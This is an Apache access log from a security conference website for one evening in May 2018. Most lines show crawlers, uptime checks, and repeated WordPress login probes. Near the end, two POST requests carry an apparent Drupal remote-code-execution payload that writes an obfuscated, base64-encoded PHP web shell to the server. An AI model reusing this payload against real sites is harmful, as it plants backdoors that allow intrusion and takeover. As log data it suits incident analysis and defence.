69.162.124.227 - - [06/May/2018:18:07:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.63 - - [06/May/2018:18:07:37 -0400] "GET /past HTTP/1.1" 200 6861 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
94.166.37.120 - - [06/May/2018:18:07:49 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.166.37.120 - - [06/May/2018:18:07:50 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.201.189.162 - - [06/May/2018:18:07:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.201.189.162 - - [06/May/2018:18:07:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [06/May/2018:18:07:55 -0400] "GET /2018/dates HTTP/1.1" 200 6270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.38 - - [06/May/2018:18:08:20 -0400] "GET /robots.txt HTTP/1.1" 200 4979 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
78.185.164.110 - - [06/May/2018:18:10:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.185.164.110 - - [06/May/2018:18:10:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:18:12:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
82.7.169.200 - - [06/May/2018:18:13:35 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.7.169.200 - - [06/May/2018:18:13:36 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [06/May/2018:18:14:20 -0400] "GET /2005/submission.content HTTP/1.1" 200 5114 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.70.40.11 - - [06/May/2018:18:14:50 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
52.53.183.95 - - [06/May/2018:18:15:15 -0400] "GET / HTTP/1.1" 200 6701 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"
77.88.47.40 - - [06/May/2018:18:15:24 -0400] "GET /1999/program.html HTTP/1.1" 200 6349 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [06/May/2018:18:15:41 -0400] "GET /2005/dates.shtml HTTP/1.1" 200 4997 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.70.40.11 - - [06/May/2018:18:15:48 -0400] "GET /2010 HTTP/1.1" 200 6722 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
69.162.124.227 - - [06/May/2018:18:17:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [06/May/2018:18:17:25 -0400] "GET /2009/proceedings/2005/nspw2005-ford.pdf HTTP/1.1" 200 2046436 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [06/May/2018:18:19:22 -0400] "GET /2006/past.shtml HTTP/1.1" 200 5613 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [06/May/2018:18:19:34 -0400] "GET /2004/oc.content HTTP/1.1" 200 6193 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [06/May/2018:18:21:16 -0400] "GET /papers/1996/nspw1996-zurko.pdf HTTP/1.1" 200 887095 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:18:22:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.98.19.138 - - [06/May/2018:18:23:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.98.19.138 - - [06/May/2018:18:23:16 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.0.38.97 - - [06/May/2018:18:24:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.0.38.97 - - [06/May/2018:18:24:14 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.210.17.225 - - [06/May/2018:18:25:41 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.210.17.225 - - [06/May/2018:18:25:44 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.49.59.4 - - [06/May/2018:18:26:04 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.49.59.4 - - [06/May/2018:18:26:05 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:18:27:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [06/May/2018:18:32:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [06/May/2018:18:34:32 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.217 - - [06/May/2018:18:34:35 -0400] "GET /2018 HTTP/1.1" 200 6905 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:18:38:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.16 - - [06/May/2018:18:39:15 -0400] "GET /2010/sponsors HTTP/1.1" 404 7939 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.13.64 - - [06/May/2018:18:39:51 -0400] "GET /2007/invite/ HTTP/1.1" 200 4855 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.106.76.163 - - [06/May/2018:18:40:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.106.76.163 - - [06/May/2018:18:40:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.162 - - [06/May/2018:18:40:52 -0400] "GET /2009/proceedings/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 200 531990 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [06/May/2018:18:43:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
129.60.39.117 - - [06/May/2018:18:43:56 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "http://www.nspw.org/2017/program" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
38.140.128.230 - - [06/May/2018:18:44:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
38.140.128.230 - - [06/May/2018:18:44:27 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [06/May/2018:18:47:56 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 572715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:18:48:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.151 - - [06/May/2018:18:52:36 -0400] "GET /2005/papers.content HTTP/1.1" 200 6073 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [06/May/2018:18:53:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.13.64 - - [06/May/2018:18:53:57 -0400] "GET /2007/invite/ HTTP/1.1" 200 4855 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [06/May/2018:18:56:38 -0400] "GET /papers/2010/?C=S;O=D HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [06/May/2018:18:58:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.247 - - [06/May/2018:19:01:03 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.219 - - [06/May/2018:19:01:15 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.155.204.100 - - [06/May/2018:19:02:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:19:03:28 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.75.76.161 - - [06/May/2018:19:03:53 -0400] "GET /robots.txt HTTP/1.1" 200 4601 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.161 - - [06/May/2018:19:04:04 -0400] "GET /proceedings/2005 HTTP/1.1" 200 7264 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.161 - - [06/May/2018:19:04:14 -0400] "GET /2014/organizers HTTP/1.1" 200 7179 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.161 - - [06/May/2018:19:04:25 -0400] "GET /2008/oc.content HTTP/1.1" 200 8055 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.161 - - [06/May/2018:19:04:35 -0400] "GET /2016/sponsors HTTP/1.1" 200 6400 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.161 - - [06/May/2018:19:04:46 -0400] "GET /2005/pc.shtml HTTP/1.1" 200 5483 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
86.137.104.111 - - [06/May/2018:19:04:26 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 617821 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
109.100.109.185 - - [06/May/2018:19:05:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.100.109.185 - - [06/May/2018:19:05:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.12.200.94 - - [06/May/2018:19:07:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.12.200.94 - - [06/May/2018:19:07:34 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:19:08:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [06/May/2018:19:08:52 -0400] "GET /2002/index.content HTTP/1.1" 200 4617 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
191.116.144.31 - - [06/May/2018:19:11:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.116.144.31 - - [06/May/2018:19:11:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
59.106.108.116 - - [06/May/2018:19:12:51 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
59.106.108.116 - - [06/May/2018:19:13:03 -0400] "GET /current/ HTTP/1.1" 200 12401 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
69.162.124.227 - - [06/May/2018:19:13:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [06/May/2018:19:14:36 -0400] "GET /2009/proceedings/2013/nspw2013-ashenden.pdf HTTP/1.1" 200 684762 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [06/May/2018:19:16:05 -0400] "GET /2005/cfp.content HTTP/1.1" 200 8996 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
70.180.241.35 - - [06/May/2018:19:17:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
70.180.241.35 - - [06/May/2018:19:17:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:19:18:28 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.63 - - [06/May/2018:19:20:02 -0400] "GET /2009/proceedings/2012/docs/p53.pdf HTTP/1.1" 200 2130218 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [06/May/2018:19:23:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.215 - - [06/May/2018:19:24:06 -0400] "GET /current/cfp.shtml HTTP/1.1" 404 8008 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.28 - - [06/May/2018:19:25:56 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658151 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.219 - - [06/May/2018:19:27:56 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [06/May/2018:19:28:07 -0400] "GET /2018/dates HTTP/1.1" 200 6746 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
182.150.27.152 - - [06/May/2018:19:28:24 -0400] "GET /papers/1996/nspw1996-baker.pdf HTTP/1.1" 200 482978 "-" "Mozilla/5.0 (Linux; Android 4.4.4; HTC D820u Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Safari/537.36"
69.162.124.227 - - [06/May/2018:19:28:28 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.21.45.215 - - [06/May/2018:19:30:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.21.45.215 - - [06/May/2018:19:30:28 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.166.74.131 - - [06/May/2018:19:32:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.166.74.131 - - [06/May/2018:19:32:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
182.150.27.152 - - [06/May/2018:19:28:15 -0400] "GET /papers/1996/nspw1996-baker.pdf HTTP/1.1" 200 278542 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
69.162.124.227 - - [06/May/2018:19:33:28 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [06/May/2018:19:36:25 -0400] "GET /proceedings/2004 HTTP/1.1" 200 6158 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.247 - - [06/May/2018:19:37:16 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [06/May/2018:19:38:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
190.192.154.167 - - [06/May/2018:19:38:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.192.154.167 - - [06/May/2018:19:38:33 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.137.179.104 - - [06/May/2018:19:39:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.137.179.104 - - [06/May/2018:19:39:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [06/May/2018:19:40:44 -0400] "GET /2006/invite/local.html HTTP/1.1" 200 4218 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [06/May/2018:19:41:15 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:19:43:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
71.83.191.70 - - [06/May/2018:19:44:55 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2011/nspw2011-bishop.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
71.83.191.70 - - [06/May/2018:19:44:55 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 572730 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
180.23.174.51 - - [06/May/2018:19:46:39 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
69.162.124.227 - - [06/May/2018:19:48:27 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
107.21.1.8 - - [06/May/2018:19:51:18 -0400] "GET / HTTP/1.1" 200 6442 "https://www.nspw.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [06/May/2018:19:51:18 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [06/May/2018:19:51:18 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
199.59.150.181 - - [06/May/2018:19:51:45 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
199.59.150.180 - - [06/May/2018:19:51:45 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
91.105.64.146 - - [06/May/2018:19:52:33 -0400] "GET / HTTP/1.1" 200 6450 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
91.105.64.146 - - [06/May/2018:19:52:37 -0400] "POST /user/password?name[%23post_render][0]=passthru&name%5B%23markup%5D=mv+-f+sites%2Fdefault%2Ffiles%2F.htaccess+sites%2Fdefault%2Ffiles%2F.hatccess%3Becho+PD9waHAgZWNobyA3NDU3NzM3KzczNjcyMzskcmFQb19yWmx1b0U9YmFzZTY0X2RlY29kZSgiWSIuY2hyKDEwOSkuIkYiLmNocigxMjIpLmNocig5MCkuIlQiLmNocig4OSkuY2hyKDQ4KS5jaHIoODgpLiIyIi4iUiIuImwiLiJZIi5jaHIoNTApLiI5Ii5jaHIoMTA3KS4iWiIuY2hyKDgxKS4iPSIuIj0iKTskeWRTSlB0bndyU3Y9YmFzZTY0X2RlY29kZShjaHIoODkpLiIyIi5jaHIoNTcpLmNocigxMTkpLmNocigxMDEpLmNocig4MSkuY2hyKDYxKS4iPSIpO2V2YWwoJHJhUG9fclpsdW9FKCRfUE9TVFtiYXNlNjRfZGVjb2RlKGNocig5NykuY2hyKDg3KS4iUSIuY2hyKDYxKSldKSk7aWYoJF9QT1NUW2Jhc2U2NF9kZWNvZGUoImQiLmNocig4OCkuY2hyKDY1KS4iPSIpXSA9PSBiYXNlNjRfZGVjb2RlKCJkIi4iWCIuY2hyKDY1KS5jaHIoNjEpKSl7QCR5ZFNKUHRud3JTdigkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoY2hyKDkwKS4ibSIuImwiLiJzIi5jaHIoOTApLiJRIi4iPSIuY2hyKDYxKSldW2Jhc2U2NF9kZWNvZGUoY2hyKDEwMCkuY2hyKDcxKS5jaHIoNDkpLiJ3Ii4iWCIuY2hyKDUwKS4iNSIuY2hyKDEwNCkuImIiLmNocig4NykuIlUiLmNocig2MSkpXSwkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoIloiLmNocigxMDkpLiJsIi4icyIuY2hyKDkwKS4iUSIuY2hyKDYxKS5jaHIoNjEpKV1bYmFzZTY0X2RlY29kZShjaHIoOTgpLiJtIi4iRiIuY2hyKDExNikuIloiLmNocig4MSkuY2hyKDYxKS4iPSIpXSk7fTsgPz4%3D%7Cbase64+--decode%7Ctee+sites%2Fdefault%2Ffiles%2Faccesson.php HTTP/1.1" 200 3402 "https://www.nspw.org/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
91.105.64.146 - - [06/May/2018:19:52:38 -0400] "POST /file/ajax/name/%23value/form-yjjuQEjTgb1J9Bwu07R9Y1SyoIbtbT58U9rYmhztkfg HTTP/1.1" 200 1977 "https://www.nspw.org/user/password?name[%23post_render][0]=passthru&name%5B%23markup%5D=mv+-f+sites%2Fdefault%2Ffiles%2F.htaccess+sites%2Fdefault%2Ffiles%2F.hatccess%3Becho+PD9waHAgZWNobyA3NDU3NzM3KzczNjcyMzskcmFQb19yWmx1b0U9YmFzZTY0X2RlY29kZSgiWSIuY2hyKDEwOSkuIkYiLmNocigxMjIpLmNocig5MCkuIlQiLmNocig4OSkuY2hyKDQ4KS5jaHIoODgpLiIyIi4iUiIuImwiLiJZIi5jaHIoNTApLiI5Ii5jaHIoMTA3KS4iWiIuY2hyKDgxKS4iPSIuIj0iKTskeWRTSlB0bndyU3Y9YmFzZTY0X2RlY29kZShjaHIoODkpLiIyIi5jaHIoNTcpLmNocigxMTkpLmNocigxMDEpLmNocig4MSkuY2hyKDYxKS4iPSIpO2V2YWwoJHJhUG9fclpsdW9FKCRfUE9TVFtiYXNlNjRfZGVjb2RlKGNocig5NykuY2hyKDg3KS4iUSIuY2hyKDYxKSldKSk7aWYoJF9QT1NUW2Jhc2U2NF9kZWNvZGUoImQiLmNocig4OCkuY2hyKDY1KS4iPSIpXSA9PSBiYXNlNjRfZGVjb2RlKCJkIi4iWCIuY2hyKDY1KS5jaHIoNjEpKSl7QCR5ZFNKUHRud3JTdigkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoY2hyKDkwKS4ibSIuImwiLiJzIi5jaHIoOTApLiJRIi4iPSIuY2hyKDYxKSldW2Jhc2U2NF9kZWNvZGUoY2hyKDEwMCkuY2hyKDcxKS5jaHIoNDkpLiJ3Ii4iWCIuY2hyKDUwKS4iNSIuY2hyKDEwNCkuImIiLmNocig4NykuIlUiLmNocig2MSkpXSwkX0ZJTEVTW2Jhc2U2NF9kZWNvZGUoIloiLmNocigxMDkpLiJsIi4icyIuY2hyKDkwKS4iUSIuY2hyKDYxKS5jaHIoNjEpKV1bYmFzZTY0X2RlY29kZShjaHIoOTgpLiJtIi4iRiIuY2hyKDExNikuIloiLmNocig4MSkuY2hyKDYxKS4iPSIpXSk7fTsgPz4%3D%7Cbase64+--decode%7Ctee+sites%2Fdefault%2Ffiles%2Faccesson.php" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"
77.88.47.40 - - [06/May/2018:19:52:41 -0400] "GET /2006/pc.shtml HTTP/1.1" 200 5714 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
